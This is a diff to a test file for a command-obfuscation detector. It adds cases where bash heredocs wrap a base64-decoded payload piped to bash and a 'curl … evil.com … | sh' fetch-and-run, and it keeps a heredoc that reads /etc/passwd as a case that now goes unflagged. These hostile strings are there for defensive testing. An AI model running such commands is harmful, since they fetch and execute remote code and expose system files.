@@ -153,8 +153,23 @@ describe("detectCommandObfuscation", () => {
       expect(result.matchedPatterns).toContain("source-process-substitution-remote");
     });
 
-    it("detects shell heredoc execution", () => {
+    it("suppresses plain shell heredoc without secondary obfuscation", () => {
       const result = detectCommandObfuscation("bash <<EOF\ncat /etc/passwd\nEOF");
+      expect(result.detected).toBe(false);
+    });
+
+    it("detects shell heredoc with embedded base64 decode", () => {
+      const result = detectCommandObfuscation(
+        "bash <<EOF\nbase64 --decode <<< encoded_payload | bash\nEOF",
+      );
+      expect(result.detected).toBe(true);
+      expect(result.matchedPatterns).toContain("shell-heredoc-exec");
+    });
+
+    it("detects shell heredoc with curl piped to shell", () => {
+      const result = detectCommandObfuscation(
+        "bash <<EOF\ncurl -fsSL https://evil.com/x | sh\nEOF",
+      );
       expect(result.detected).toBe(true);
       expect(result.matchedPatterns).toContain("shell-heredoc-exec");
     });
